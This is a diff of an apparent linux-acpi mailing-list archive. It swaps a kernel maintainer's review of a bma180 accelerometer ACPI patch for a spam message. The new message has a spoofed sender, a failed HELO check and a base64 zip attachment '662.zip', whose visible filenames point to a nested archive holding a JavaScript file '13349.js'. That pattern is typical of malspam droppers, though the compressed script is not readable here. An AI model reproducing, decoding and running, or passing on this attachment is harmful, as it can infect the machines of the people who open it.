@@ -1,99 +1,47 @@
-From: Jonathan Cameron <jic23@kernel.org>
-Subject: Re: [PATCH] iio: accel: bma180: Add ACPI enumeration support
-Date: Wed, 26 Apr 2017 07:40:33 +0100
-Message-ID: <08327ffe-119a-b62b-a6f9-0f485444bd9a@kernel.org>
-References: <20170421073812.12531-1-hdegoede@redhat.com>
+From: <info@cityofnorthbay.ca>
+Subject: 48960 linux-acpi
+Date: Wed, 26 Apr 2017 07:46:32 -0000
+Message-ID: <149319279269.22262.17731223299642088550@hinet.net>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Transfer-Encoding: 7bit
+Content-Type: application/zip; name="662.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-acpi-owner@vger.kernel.org>
-Received: from saturn.retrosnub.co.uk ([178.18.118.26]:58505 "EHLO
-        saturn.retrosnub.co.uk" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1956147AbdDZGkl (ORCPT
-        <rfc822;linux-acpi@vger.kernel.org>); Wed, 26 Apr 2017 02:40:41 -0400
-In-Reply-To: <20170421073812.12531-1-hdegoede@redhat.com>
-Content-Language: en-GH
+Received: from 114-42-112-217.dynamic-ip.hinet.net ([114.42.112.217]:47983
+        "HELO hinet.net" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org
+        with SMTP id S1952030AbdDZHqq (ORCPT
+        <rfc822;linux-acpi@vger.kernel.org>); Wed, 26 Apr 2017 03:46:46 -0400
+Content-Disposition: attachment
 Sender: linux-acpi-owner@vger.kernel.org
 List-Id: linux-acpi@vger.kernel.org
-To: Hans de Goede <hdegoede@redhat.com>
-Cc: linux-acpi@vger.kernel.org, Lars-Peter Clausen <lars@metafoo.de>, Peter Meerwald-Stadler <pmeerw@pmeerw.net>, linux-iio@vger.kernel.org
+To: linux-acpi@vger.kernel.org
 
-On 21/04/17 08:38, Hans de Goede wrote:
-> Some x86 tablets use the bms250 accelerometer, add support for this.
-> 
-> Signed-off-by: Hans de Goede <hdegoede@redhat.com>
-Hi Hans,
-
-Would you mind rebasing this on the latest iio.git togreg branch?
-(which should be the same as linux-next by now if that is easier)
-Some OF bindings got added in the recent cycle that make it not
-apply cleanly.
-
-Thanks,
-
-Jonathan
-> ---
->  drivers/iio/accel/bma180.c | 20 +++++++++++++++++++-
->  1 file changed, 19 insertions(+), 1 deletion(-)
-> 
-> diff --git a/drivers/iio/accel/bma180.c b/drivers/iio/accel/bma180.c
-> index 0890934..5c75190 100644
-> --- a/drivers/iio/accel/bma180.c
-> +++ b/drivers/iio/accel/bma180.c
-> @@ -14,6 +14,7 @@
->   * BMA250: 7-bit I2C slave address 0x18 or 0x19
->   */
->  
-> +#include <linux/acpi.h>
->  #include <linux/module.h>
->  #include <linux/i2c.h>
->  #include <linux/interrupt.h>
-> @@ -705,6 +706,8 @@ static const struct iio_trigger_ops bma180_trigger_ops = {
->  static int bma180_probe(struct i2c_client *client,
->  		const struct i2c_device_id *id)
->  {
-> +	struct device *dev = &client->dev;
-> +	const struct acpi_device_id *acpi_id;
->  	struct bma180_data *data;
->  	struct iio_dev *indio_dev;
->  	int ret;
-> @@ -716,7 +719,15 @@ static int bma180_probe(struct i2c_client *client,
->  	data = iio_priv(indio_dev);
->  	i2c_set_clientdata(client, indio_dev);
->  	data->client = client;
-> -	data->part_info = &bma180_part_info[id->driver_data];
-> +	if (id) {
-> +		data->part_info = &bma180_part_info[id->driver_data];
-> +	} else {
-> +		acpi_id = acpi_match_device(dev->driver->acpi_match_table, dev);
-> +		if (!acpi_id)
-> +			return -ENODEV;
-> +
-> +		data->part_info = &bma180_part_info[acpi_id->driver_data];
-> +	}
->  
->  	ret = data->part_info->chip_config(data);
->  	if (ret < 0)
-> @@ -836,6 +847,12 @@ static SIMPLE_DEV_PM_OPS(bma180_pm_ops, bma180_suspend, bma180_resume);
->  #define BMA180_PM_OPS NULL
->  #endif
->  
-> +static const struct acpi_device_id bma180_acpi_match[] = {
-> +	{ "BMA250E", BMA250 },
-> +	{ }
-> +};
-> +MODULE_DEVICE_TABLE(acpi, bma180_acpi_match);
-> +
->  static struct i2c_device_id bma180_ids[] = {
->  	{ "bma180", BMA180 },
->  	{ "bma250", BMA250 },
-> @@ -847,6 +864,7 @@ MODULE_DEVICE_TABLE(i2c, bma180_ids);
->  static struct i2c_driver bma180_driver = {
->  	.driver = {
->  		.name	= "bma180",
-> +		.acpi_match_table = ACPI_PTR(bma180_acpi_match),
->  		.pm	= BMA180_PM_OPS,
->  	},
->  	.probe		= bma180_probe,
-> 
-
+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
